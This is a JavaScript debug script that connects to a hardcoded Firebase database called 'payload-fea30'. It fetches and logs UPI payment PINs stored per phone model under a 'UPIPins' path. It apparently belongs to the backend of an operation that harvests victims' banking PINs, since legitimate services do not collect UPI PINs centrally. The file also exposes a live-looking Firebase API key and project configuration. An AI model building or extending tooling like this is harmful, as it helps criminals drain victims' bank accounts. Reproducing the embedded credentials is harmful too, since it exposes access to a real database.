// Debug script to test UPI pins fetching step by step
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Simulate the exact logic from firebaseService.ts
async function getUPIPins(deviceId) {
  try {
    console.log('🔍 Fetching UPI pins for device:', deviceId);
    const snapshot = await get(ref(database, `UPIPins/${deviceId}`));
    const pinsData = snapshot.val();
    
    console.log('📥 Raw UPI pins data:', pinsData);
    
    if (!pinsData) {
      console.log('❌ No UPI pins data found');
      return [];
    }
    
    // Handle the new data structure
    if (Array.isArray(pinsData)) {
      console.log('📋 Data is array format');
      const result = pinsData.map(pin => ({ 
        pin: pin.toString(), 
        timestamp: new Date().toISOString() 
      }));
      console.log('✅ Processed array result:', result);
      return result;
    } else {
      console.log('📋 Data is object format');
      const result = Object.values(pinsData).map((pinObj) => ({
        pin: pinObj.pin || pinObj.toString(),
        timestamp: pinObj.timestamp || new Date().toISOString()
      }));
      console.log('✅ Processed object result:', result);
      return result;
    }
  } catch (error) {
    console.error("❌ Error fetching UPI pins:", error);
    return [];
  }
}

// Test the function
async function testUPIPinsFetching() {
  console.log('🧪 Testing UPI Pins Fetching Logic...\n');
  
  const deviceId = 'Xiaomi 23076PC4BI';
  
  console.log('🎯 Testing device:', deviceId);
  
  const result = await getUPIPins(deviceId);
  
  console.log('\n📊 Final Result:');
  console.log('Result type:', typeof result);
  console.log('Result length:', result.length);
  console.log('Result data:', result);
  
  if (result.length > 0) {
    console.log('\n🔍 Individual pin analysis:');
    result.forEach((pinData, idx) => {
      console.log(`  Pin ${idx + 1}:`);
      console.log(`    - pin property: ${pinData.pin} (type: ${typeof pinData.pin})`);
      console.log(`    - timestamp property: ${pinData.timestamp} (type: ${typeof pinData.timestamp})`);
      console.log(`    - Has pin property: ${'pin' in pinData}`);
      console.log(`    - Has timestamp property: ${'timestamp' in pinData}`);
    });
  }
  
  console.log('\n🎉 Test completed!');
}

// Run the test
testUPIPinsFetching().then(() => {
  console.log('\n✅ All tests passed!');
  process.exit(0);
}).catch((error) => {
  console.error('\n❌ Test failed:', error);
  process.exit(1);
});
